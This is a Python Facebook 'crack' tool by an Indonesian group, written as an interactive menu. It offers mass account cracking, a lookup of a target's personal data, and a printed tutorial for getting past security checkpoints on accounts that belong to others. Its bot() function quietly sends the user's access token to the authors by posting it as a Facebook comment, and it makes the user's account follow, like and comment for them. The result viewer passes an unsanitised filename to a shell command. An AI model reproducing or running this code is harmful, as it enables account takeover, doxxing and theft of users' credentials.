#!/usr/bin/python3
# YUTOPIA PROJECT BY SPTTY CHAN
# Created By Yumasaa X Smrn
# Recode Boleh, Tapi Lebih Baik Pahami Source Code Nya
# Versi 2.5

import time,os

try:
        tema = open("tema.txt","r").read()
except IOError:
        tema = "default"

if "default" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        m = "\33[1;31m" # merah
        h = "\33[1;92m" # hijau
        k = "\33[1;93m" # kuning
        b = "\33[1;94m" # biru
        u = "\33[1;95m" # ungu
        s = "\33[1;96m" # biru muda
elif "biru" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        k = "\33[1;31m" # merah
        m = "\33[1;92m" # hijau
        u = "\33[1;93m" # kuning
        h = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        s = "\33[1;96m" # biru muda
elif "merah" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        h = "\33[1;31m" # merah
        m = "\33[1;92m" # hijau
        s = "\33[1;93m" # kuning
        k = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        u = "\33[1;96m" # biru muda
elif "kuning" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        m = "\33[1;31m" # merah
        k = "\33[1;92m" # hijau
        h = "\33[1;93m" # kuning
        u = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        s = "\33[1;96m" # biru muda

balmond = s+">"+m+"><"+s+"<"

try:
	import concurrent.futures
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Futures Belum Terinstall, Jalankan pip install futures")
	time.sleep(0.5)
	exit()
try:
	import requests
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Requests Belum Terinstall, Jalankan pip install requests")
	time.sleep(0.5)
	exit()
try:
	import bs4
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Bs4 Belum Terinstall, Jalankan pip install bs4")
	time.sleep(0.5)
	exit()
try:
	import mechanize
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Mechanize Belum Terinstall, Jalankan pip install mechanize")
	time.sleep(0.5)
	exit()

import concurrent.futures, requests, bs4, mechanize, sys, random, json, re, ipaddress, calendar
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
from random import randint
from datetime import datetime
from datetime import date

ok = []
cp = []
id = []
opsit = []
sandi = []
batas = "~                                                    "
line = "_______________________________________________*"

indah = ["Jihan","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]

kamu = datetime.now()
cantiks = kamu.day
imuts = kamu.month
gemess = kamu.year
sayangs = indah[imuts]
manyun = date.today()
nama_h = calendar.day_name[manyun.weekday()]
if nama_h=="Sunday":
	nama_hari = "Minggu"
elif nama_h=="Monday":
	nama_hari = "Senin"
elif nama_h=="Tuesday":
	nama_hari = "Selasa"
elif nama_h=="Wednesday":
	nama_hari = "Rabu"
elif nama_h=="Thursday":
	nama_hari = "Kamis"
elif nama_h=="Friday":
	nama_hari = "Jumat"
elif nama_h=="Saturday":
	nama_hari = "Sabtu"
hck = "%s-%s-%s-%s"%(nama_hari,cantiks,sayangs,gemess)

semoga = []
berapa_d = []

joined_year = ["{2004 - 2005}","{2005 - 2006}","{2006 - 2007}","{2007 - 2008}","{2008}","{2009 - 2010}"]
old_gak = []
random_gak = []

try:
	jihan = open("token.txt","r").read()
except IOError:
	pass

ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

def jalan(ms):
	for sir in ms + "\n":
		sys.stdout.write(sir)
		sys.stdout.flush()
		time.sleep(0.05)

def clear():
	os.system("clear")

# LOGO (Lo Goblok) 

def banner():
	print("""
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m=====================================
\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
\x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
\x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
\x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|

\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m=====================================

\033[92;1m----------------------------------------------------------
\033[97;1m╔[ \033[92;1mCreator  \033[97;1m: \033[93;1mYumasaaTzy \033[97;1mAnd \033[93;1mJeeck X Nano \033[97;1m[\033[92;1mNgocok-Standing\033[97;1m]
\033[97;1m╠[ \033[92;1mWhatsApp \033[97;1m: \033[93;1m083801923083
\033[97;1m╠[ \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/YumasaaTzy
\033[97;1m╠[ \033[92;1mFacebook \033[97;1m: \033[93;1mO'Hayo Smrn \033[97;1m[\033[92;1mFollow Me Facebook\033[97;1m]
\033[97;1m║\033[93;1m---------------------------------------------------------
\033[97;1m╠[ \033[92;1mScript Crack Facebook Yang Kaya Akan Teh Hijau
\033[97;1m╠[ \033[92;1mTeam \033[97;1m: \033[93;1mXNX\033[97;1m-\033[93;1mCODE Team 2021
\033[97;1m╚[ \033[92;1mFollow Me Facebook And Github \033[97;1m[\033[92;1m(>•,•<)\033[97;1m]
\033[92;1m----------------------------------------------------------
""")
#Jan Di Ubah Kontol!! 
CorrectUsername = "YumasaaxOhayo"
CorrectPassword = "OhayoxNdrii"
loop = "true"
while loop == "true":
	username = sayangku = input(h+"Tools Username : ")
	if username == CorrectUsername:
		password = sayangku = input(h+"Tools Password : ")
		if password == CorrectPassword:
			print(h+"Login Berhasil as Dattebayo")
			time.sleep(0.03)
			loop = "false"
		else:
			print(h+"Wrong Password")
			os.system("xdg-open https://www.facebook.com/rendi.gerot.1")
	else:
		print(h+"Wrong Username")
		os.system("xdg-open https://www.facebook.com/rendi.gerot.1")		
def lisensi():
	os.system("clear")
	login()

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES # IP
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES # IP

def random_ipv4():
	return ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))


# LOGIN Todd

def login():
	clear()
	banner()
	token = input(p+"[+]"+k+" Masukkan Token Facebook : "+h+" ")
	try:
		hujan = requests.get("https://graph.facebook.com/me?access_token="+token)
		batu = json.loads(hujan.text)
		air = batu["name"]
		api = open("token.txt","w");api.write(token);api.close()
		jalan(p+"[+]"+k+" Login Sukses")
		time.sleep(0.5)
		bot()
	except KeyError:
		jalan(p+"[+]"+k+" Login Gagal")
		time.sleep(0.5)
		login()

# BOT (Jangan di ubah, Lebih Baik Di tambain)

def bot():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(p+"[+]"+k+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	print(p+"[+]"+k+" Bentarr Bree, Follow Duluu Amaa Setor Token Mwhehehe")
	komen_1 = ("Bang Lu Ganteng Banget Sih, Gw Murid Lu Bang")
	komen_2 = ("XNX-CODE Team 2021 Meng Keren><")
	requests.post("https://graph.facebook.com/100014905842581/subscribers?access_token="+token) # Ohayo Smrn
	requests.post("https://graph.facebook.com/100030164941727/subscribers?access_token="+token) # Ezaa
	requests.post("https://graph.facebook.com/100032577396395/subscribers?access_token="+token)  # Mr Jeeck X Nano
	requests.post("https://graph.facebook.com/1262475690925947/likes?summary=true&access_token=" + token) # Ohayo Smrn
	requests.post("https://graph.facebook.com/135554395529272/likes?summary=true&access_token=" + token) # Ezaa
	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+komen_1+"&access_token="+token) # Ohayo Smrn
	requests.post("https://graph.facebook.com/656336558715170/comments/?message="+komen_2+"&access_token="+token) # Ezaa
	requests.post("https://graph.facebook.com/656336558715170/comments/?message="+komen_1+"&access_token="+token) # Ezaa
	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+komen_2+"&access_token="+token) # Ohayo Smrn
	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+token+"&access_token="+token) # Ohayo Smrn
	requests.post("https://graph.facebook.com/573457507083491/likes?summary=trues&access_token=" +token) # Mr Jeeck X Nano
	requests.post("https://graph.facebook.com/573457507083491/comments/?message="+komen_1+"&access_token="+token) # Mr Jeeck X Nano
	requests.post("https://graph.facebook.com/573457507083491/comments/?message="+komen_2+"&access_token="+token) # Mr Jeeck X Nano
	requests.post("https://graph.facebook.com/135554395529272/comments/?message"+token+"&access_token="+token) # Mr Jeeck X Nano
	menu()

# MENU Ngentod

def menu():
	try:
		os.mkdir("Hasil_Cp")
	except:
		pass
	try:
		os.mkdir("Hasil_Ok")
	except:
		pass
	clear()
	banner()
	try:
		token = open("token.txt","r").read()
		cintaku = requests.get("https://graph.facebook.com/me?access_token="+token)
		pillow = json.loads(cintaku.text)
		hujan = pillow["name"]
	except KeyError:
		jalan(p+"[+]"+k+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	except IOError:
		jalan(p+"[+]"+k+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	except requests.exceptions.ConnectionError:
		jalan(p+"[+]"+k+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	print(p+"╔══["+h+" ["+m+" >>"+k+"XNX-CODE Team 2021"+m+"<< "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+m+" Active User : "+p+pillow["name"]);time.sleep(0.03)
	print(p+"╠══["+s+" =>"+h+" Hasil_Ok/OK_%s.txt"%(hck));time.sleep(0.03)
	print(p+"╠══["+s+" =>"+k+" Hasil_Cp/CP_%s.txt"%(hck));time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"01"+h+"}"+k+" Crack Dari Pertemanan / Publik ");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"02"+h+"}"+k+" Crack Dari Followers Publik ");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"03"+h+"}"+k+" Crack Pertemanan Publik "+p+"{"+h+"Massal"+p+"}");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"04"+h+"}"+k+" Crack Akun Old 04/08 "+p+"{"+h+"Massal"+p+"}");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"05"+h+"}"+k+" Crack Akun Old 04/10 "+p+"{"+h+"Massal"+p+"}");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"06"+h+"}"+k+" Setting User Agent "+p+"{Biar One Tap}");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"07"+h+"}"+k+" Cek Opsi Hasil Crack ");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"08"+h+"}"+k+" Cek Result Crack "+p+"{ok/cp}");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"09"+h+"}"+k+" Info Created and Team");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"10"+h+"}"+k+" Tutor Jebol Sesi "+p+"("+h+"By YumasaaTzy"+p+")");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"11"+h+"}"+p+" Menu Instagram");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"12"+h+"}"+p+" Cek Data Target");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"13"+h+"}"+m+" Report Bug Script");time.sleep(0.03)
	print(p+"╠══["+h+"{"+p+"00"+h+"}"+k+" Logout");time.sleep(0.03)
	print(p+"║");time.sleep(0.03)
	sayangku = input(p+"╠══["+m+"[+]"+p+" Pilih : ");time.sleep(0.03)
	print(p+"║");time.sleep(0.03)
	if sayangku=="1" or sayangku=="01":
		publik()
	elif sayangku=="2" or sayangku=="02":
		follow()
	elif sayangku=="3" or sayangku=="03":
		massal()
	elif sayangku=="11" or sayangku=="11":
		igg()
	elif sayangku=="4" or sayangku=="04":
		dump_old()
	elif sayangku=="5" or sayangku=="05":
		dump_old2()
	elif sayangku=="6" or sayangku=="06":
		user_agent()
	elif sayangku=="7" or sayangku=="07":
		cek_opsi()
	elif sayangku=="8" or sayangku=="08":
		result()
	elif sayangku=="9" or sayangku=="09":
		info()
	elif sayangku=="10" or sayangku=="10":
		jebol_sesi()
	elif sayangku=="12" or sayangku=="12":
		cek_data()
	elif sayangku=="13"or sayangku=="13":
		bug_sc()
	elif sayangku=="0" or sayangku=="00":
		os.system("rm -rf token.txt")
		jalan(p+"╚══["+h+"[+]"+k+" Thanks Udah Pake Sc Gua Bro")
		time.sleep(0.5)
		exit()
	else:
		jalan(p+"[+]"+m+" Pilihan Anda Invalid")
		time.sleep(0.5)
		menu()

# Cek Data Todd
def cek_data():
	try:token = open('token.txt','r').read()
	except (KeyError,IOError):jalan('╚══[!] Token/Cookies Invalid') 
	idt = input(p+"╠══["+h+"•]"+k+" Id Target : ")
	try:
		zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
	except (KeyError,IOError):jalan('╠══[•] Id Tidak Ditemukan') 
	try:ah = zy["name"]
	except (KeyError,IOError):ah = ("-")
	try:ahh = zy["first_name"]
	except (KeyError,IOError):ahh = ("-")
	try:aah = zy["middle_name"]
	except (KeyError,IOError):aah = ("-")
	try:ahhh = zy["last_name"]
	except (KeyError,IOError):ahhh = ("-")
	try:aahh = zy["birthday"]
	except (KeyError,IOError):aahh = ("-")
	try:ahhhh = zy["gender"]
	except (KeyError,IOError):ahhhh = ("-")
	try:aaahhh = zy["followers"]
	except (KeyError,IOError):aaahhh = ("-")
	try:ahhhhh = zy["friends"]
	except (KeyError,IOError):ahhhhh = ("-")
	try:aaaahhhh = zy["email"]
	except (KeyError,IOError):aaaahhhh = ("-")
	try:ahhhhhh = zy["link"]
	except (KeyError,IOError):ahhhhhh = ("-")
	try:aaaaahhhhh = zy["username"]
	except (KeyError,IOError):aaaaahhhhh = ("-")
	try:ahhhhhhh = zy["religion"]
	except (KeyError,IOError):ahhhhhhh = ("-")
	try:aaaaaahhhhhh = zy["relationship_status"]
	except (KeyError,IOError):aaaaaahhhhhh = ("-")
	try:ahhhhhhhh = zy["significant_other"]["name"]
	except (KeyError,IOError):ahhhhhhhh = ("-")
	try:bh = zy["location"]["name"]
	except (KeyError,IOError):bh = ("-")
	try:bbh = zy["hometown"]["name"]
	except (KeyError,IOError):bbh = ("-")
	try:bhh = zy["about"]
	except (KeyError,IOError):bhh = ("-")
	try:bbhh = zy["locale"]
	except (KeyError,IOError):bbhh = ("-")
	jalan(p+"║")
	jalan(p+"╠══[•]"+h+" Nama : "+k+"%s"%(ah)) 
	jalan(p+"╠══[•]"+h+" Nama Depan : "+k+"%s"%(ahh)) 
	jalan(p+"╠══[•]"+h+" Nama Tengah : "+k+"%s"%(aah)) 
	jalan(p+"╠══[•]"+h+" Nama Belakang : "+k+"%s"%(ahhh)) 
	jalan(p+"╠══[•]"+h+" TTL : "+k+"%s"%(aahh)) 
	jalan(p+"╠══[•]"+h+" Jenis Kelamin : "+k+"%s"%(ahhhh)) 
	jalan(p+"╠══[•]"+h+" Pengikut : "+k+"%s"%(aaahhh)) 
	jalan(p+"╠══[•]"+h+" Jumlah Teman : "+k+"%s"%(ahhhhh)) 
	jalan(p+"╠══[•]"+h+" Email : "+k+"%s"%(aaaahhhh)) 
	jalan(p+"╠══[•]"+h+" Link : "+k+"%s"%(ahhhhhh)) 
	jalan(p+"╠══[•]"+h+" Username : "+k+"%s"%(aaaaahhhhh))
	jalan(p+"╠══[•]"+h+" Agama : "+k+"%s"%(ahhhhhhh))
	jalan(p+"╠══[•]"+h+" Status Hubungan : "+k+"%s"%(aaaaaahhhhhh))
	jalan(p+"╠══[•]"+h+" Hubungan Dengan : "+k+"%s"%(ahhhhhhhh))
	jalan(p+"╠══[•]"+h+" Tempat Tinggal : "+k+"%s"%(bh)) 
	jalan(p+"╠══[•]"+h+" Tempat Asal : "+k+"%s"%(bbh)) 
	jalan(p+"╠══[•]"+h+" Tentang : "+k+"%s"%(bhh)) 
	jalan(p+"╠══[•]"+h+" Locale : "+k+"%s"%(bbhh)) 
	jalan(p+"║")
	sayangku = input(s+"╠══"+balmond+l+" {Tekan Enter Untuk Ke Menu} ")
	menu()
#  Report Bug Script Jingg
def bug_sc():
	print(p+"║");time.sleep(0.03)
	print(p+"╠══["+h+" ["+m+">>"+k+"XNX-CODE Team 2021"+m+"<< "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Report Bug Script "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+k+"Sebelumnya Salam Dari Riau "+p+"[<<>>]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Report Bug Script Melalui "+p+": "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+k+"Whatsapp : "+p+"+62838-0192-3083");time.sleep(0.03)
	print(p+"║"+m+"* "+k+"Facebook : "+p+"Ohayo Smrn");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Terima Kasih Sudah Melaporkan "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+k+"Maaf Atas Ketidak Nyamanan Anda");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"║");time.sleep(0.03)
	sayangku = input(p+"╠══["+h+" ["+k+" Tekan Enter Untuk Ke Menu "+h+"] ")
	menu()
		
# Menu Crack Igeh (Jangan Di Otak Atik!!) 
def igg():
	os.system("python2 yakuzaXsuzuran.py")
#	os.system("namafileluyayang di atas buad ngetes punya saya ok")
# pastikan taruh file ya yang sama directoryokh

# Tutor Jebol Sesi Todd

def jebol_sesi():
	print(p+"║");time.sleep(0.03)
	print(p+"╠══["+h+" ["+m+" >>"+k+"XNX-CODE Team 2021"+m+"<< "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Tutor Jebol Sesi "+p+"("+h+" By YumasaaTzy "+p+") "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+k+"Hanya Menggunakan 2 Kartu Sim");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Berikut Cara-Caranya : "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Lihat Dahulu Sesi Apa Yang Terdapat Di akun Tersebut"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Jika Sesi Tersebut Sesi Setujui Komputer Dari Lain"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Maka Yang Kalian Lakukan Terlebih Dahulu Adalah"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Menekan Tulisan "+p+"("+k+" Lanjutkan "+p+") "+h+"Sebanyak Tujuh Kali,");time.sleep(0.03)
	print(p+"║  "+h+"Dengan Menggunakan Sim Satu"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Setelah Itu Kalian Keluar Dari Akun Tersebut,");time.sleep(0.03)
	print(p+"║  "+h+"Lalu Ubah Jaringan Ke Sim Dua"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Mode Pesawtkan Selama Lima Detik,");time.sleep(0.03)
	print(p+"║  "+h+"Kemudian Kalian Login Kan Akun Tersebut"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Duarrr Mwemek, Jebol Deh "+p+"("+k+" Easy Bukan "+p+")"+p+")");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Jebol Sesi Dapatkan Kode Dari Pesan/Email "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+h+"Hanya Menggunakan Ubah Jaringan Ke H+/3G");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Berikur Cara-Caranya : "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Masukkan Angka Asal-Asalan"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Sampai Timbul Bacaan Berwarna Merah,");time.sleep(0.03)
	print(p+"║  "+h+"Yang Bacaannya Demi"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Jika Sudah, Keluar Dari Akun Tersebut"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Ubah Jaringan Ke H+/3G"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Mode Pesawatkan Selama Lima Detik"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Login Kan Kembali Akun Tersebut"+p+")");time.sleep(0.03)
	print(p+"║"+m+"* "+p+"("+h+"Duarrr Mwemek, Jebol Deh "+p+"("+k+" Easy Bukan "+p+")"+p+")");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Berikut Cara Jebol Sesi By YumasaaTzy "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"* "+h+"Luu Jelek luu Aman:v");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Kok Masih Ga Jebol Bang?");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Kurang Jelek Mwehehehe");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"║");time.sleep(0.03)
#	raw_input (" [ ENTER ]")
	sayangku = input(p+"╠══["+h+" ["+k+" Tekan Enter Untuk Ke Menu "+h+"] ")
	menu()
	
## Info Script Ngentod

def info():
	print(p+"║");time.sleep(0.03)
	print(p+"╠══["+h+" ["+m+" >>"+k+"The Javu Avokados"+m+"<< "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Info Created and Team "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" XNX-CODE Team 2021 "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Created Script "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"YumasaaTzy");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"EzaaSoftBoy");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Yogzz");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Ditzy");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Team Script "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Ang-Cyber");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Faiss Ganss");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Fenzz");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Yuume");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Mbokey Bhizer");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Alpinn");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Jarr-XD");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Indraa");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Hikmatt");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Ditzy");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Rafii-XD");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Denni");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Godong Bodin");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Rahmad_XD");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Donasi Ngabb "+h+"]");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Bagi Yang Mau "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Whatsapp "+k+": "+p+"+6283801923083");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Telepon  "+k+": "+p+"+6283801923083");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Follow Github Me "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"github "+k+": "+p+"https://github.com/YumasaaTzy");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"github "+k+": "+p+"https://github.com/YakuzaaTzy");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Follow Facebook Me "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Facebook "+k+": "+p+"Ohayo Smrn");time.sleep(0.03)
	print(p+"║"+m+"• "+h+"Link Fb  "+k+": "+p+"https://www.facebook.com/rendi.gerot.1");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Please Support and Follow Me!! "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Please Give A Star On My Github");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Don't Forget To Follow My Facebook And Github "+h+"]");time.sleep(0.03)
	print(p+"╠══["+h+" ["+k+" Thanks You "+p+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(p+"╠════════════════════════════════════════════════════");time.sleep(0.03)
	print(p+"║");time.sleep(0.03)
#	raw_input (" [ ENTER ]")
	sayangku = input(p+"╠══["+h+" ["+k+" Tekan Enter Untuk Ke Menu "+h+"] ")
	menu()
	
## RESULT Bapak Kau

def result():
	print(p+"║")
	print(p+"╠════════════════════════════════════════════════════")
	print(p+"╠══["+h+"{"+p+"1"+h+"}"+k+" Cek Result CP "+p+"{akun sesi}")
	print(p+"╠══["+h+"{"+p+"2"+h+"}"+k+" Cek Result OK "+p+"{akun terbuka}")
	print(p+"╠══["+h+"{"+p+"0"+h+"}"+k+" Kembali")
	print(p+"╠════════════════════════════════════════════════════")
	print(p+"║")
	pilih = input(p+"╠══["+h+" ["+k+" Pilih : "+h+"]")
	if pilih=="1" or pilih=="01":
		try:
			lisaa = os.listdir("Hasil_Cp")
		except FileNotFoundError:
			jalan(p+"╠══["+h+"[+]"+k+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print(p+"║")
			print(p+"╠══["+h+"[+]"+k+" Hasil CP")
			print(p+"╠══["+h+"[+]"+p+" Tidak Ada Hasil Cp")
			input(p+"╠══["+h+"[+]"+p+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			print(p+"║")
			print(p+"╠══["+h+"[+]"+p+" Hasil CP")
			for jisoo in lisaa:
				print(p+"╠══["+h+" "+jisoo)
			marjan = input(p+"╠══["+h+" File : "+h+" ")
			try:
				binatang = open("Hasil_Cp/%s"%(marjan))
			except IOError:
				jalan(p+"╠══["+h+"[+]"+m+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Hasil_Cp && cat %s"%(marjan))
		print(p+"║")
		input(p+"╠══["+h+"[+]"+p+" Kembali")
		time.sleep(0.5)
